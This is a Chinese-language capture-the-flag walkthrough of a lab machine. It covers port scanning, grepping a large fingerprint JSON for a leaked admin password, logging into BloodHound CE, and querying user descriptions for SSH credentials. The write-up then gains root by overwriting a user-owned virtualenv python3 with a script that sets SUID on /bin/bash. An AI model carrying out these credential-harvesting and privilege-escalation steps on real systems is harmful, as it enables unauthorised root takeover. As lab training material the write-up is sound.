# 信息收集

起手还是老规矩，对目标进行全端口扫描和服务识别。

```bash
nmap -p 0-65535 192.168.205.147
```

扫描结果显示只开了22（SSH）、80（HTTP）和8080（HTTP-Proxy）三个端口。其中8080端口的HTTP标题引起了我的注意，是一个大名鼎鼎的域渗透分析工具BloodHound。

我先看了一眼80端口，请求了一下首页内容。

```bash
curl -s http://192.168.205.147/index.html | head -20
```

响应返回了一个巨大的JSON文件，足足有2.5MB。仔细看内容，这似乎是一个极其庞大的Web指纹库，包含了大量国内OA系统、CRM以及各种网络设备的指纹特征。

接着我去浏览器探了探8080端口的BloodHound CE，这个工具默认的密码是长密码，所以当前的利用前提是必须拿到有效的认证凭据。思路只能转回到80端口那个2.5MB的指纹库上。

既然指纹库这么大，里面会不会硬编码了某些系统的默认测试凭据？我决定直接在终端里用grep正则对整个JSON文件进行关键字检索。

```bash
curl -s http://192.168.205.147/index.html | grep -oP '(user|admin|username|login)\s*[=:]\s*["\047]?\w+["\047]?' | head -50
```

这步是为了把JSON里所有看起来像键值对或赋值语句的字符串提取出来。输出结果里，一条不起眼的记录瞬间抓住了我的眼球：`admin:oAA2a4WnLlPozQKXqLUiIyigvwrZGtQS`。

拿着这组疑似账密，我直接在浏览器打开了 `http://192.168.205.147:8080/ui/login`。输入账号密码，顺利进入 BloodHound CE 的后台看板。

# BloodHound CE突破

目标机是一台Linux，域控肯定不在本地，BloodHound 里存的只是之前采集好的 AD 域数据。我寻思着能不能从这些历史数据里翻出能用的本地机器凭据。

在 BloodHound 自带的 Cypher 查询框里，我直接写了一条语句，打算把库里所有带有描述信息的用户节点都过滤出来看一眼。

```cypher
MATCH (u:User) WHERE u.description IS NOT NULL RETURN u
```

查询执行后，界面上吐出了几个节点数据。我逐个查看返回的节点属性，其中 `HACKER@SEC.ORG` 这个用户的描述字段非常直白，里面赫然写着：“Temporary Linux access for audit testing. Credential: hacker / Hacker@123!”。

# SSH登录与提权

用拿到的账密直接去连22端口。

```bash
ssh hacker@192.168.205.147
```

密码验证成功，拿到了初始的普通用户shell。

上来先看当前用户能执行什么特权命令。

```bash
sudo -l
```

系统提示用户可以免密以root身份运行 `/usr/local/sbin/adbridge-maint`。

我直接跑了一下这个脚本看看情况。

```bash
sudo /usr/local/sbin/adbridge-maint
```

输出显示脚本在执行 `[*] Reinstalling bloodyAD...`，随后抛出了一大堆 pip 依赖安装的报错日志。从行为上看，它激活了某个Python虚拟环境并强制重装 bloodyAD 包。

我检查了脚本可能调用的虚拟环境目录。

```bash
ls -la ~/.adbridge/
```

发现 `/home/hacker/.adbridge/venv` 目录的属主是当前的hacker用户。这意味着我对这个Python虚拟环境有完全的控制权。

# Venv 环境劫持提权

当时我的第一反应是伪造一个恶意的pypi源，让它去安装我写的恶意`bloodyAD`包。我试着改了 `~/.adbridge/pip.conf` 并起了一个本地HTTP服务，但由于环境里缺少 `setuptools` 导致本地构建一直报错。

与其跟依赖作斗争，不如直接替换虚拟环境里的可执行文件。脚本运行pip必然要调用venv目录下的python解释器。

```bash
rm -rf ~/.adbridge/venv/bin/python3
cat > ~/.adbridge/venv/bin/python3 << 'EOF'
#!/bin/bash
chmod +s /bin/bash
exec /usr/bin/python3 "$@"
EOF
chmod +x ~/.adbridge/venv/bin/python3
```

我把原本的python3文件删了，写了一个同名的bash脚本。这样当sudo执行主脚本并调用这个虚拟环境的python时，就会以root权限给 `/bin/bash` 赋予SUID权限，随后再把执行流交还给系统真实的python3以免报错太难看。

再次触发提权脚本。

```bash
sudo /usr/local/sbin/adbridge-maint
```

脚本照常抛出了一些pip的执行错误，但我们的木马逻辑已经跑完了。

检查 bash 权限并弹 root shell。

```bash
ls -la /bin/bash
/bin/bash -p
```

看到 `-rwsr-xr-x` 的属性和 `euid=0(root)` 的回显，目标机器成功拿下。

```bash
bash-5.2# id
uid=1000(hacker) gid=1000(hacker) euid=0(root) egid=0(root) 组=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth),1000(hacker)
bash-5.2# cat /root/root.txt /home/hacker/user.txt
flag{root-a2456bac30fc835d1c406c02f1fd98b9}
flag{user-0f983d31e468b53950efda13b14896bd}
```

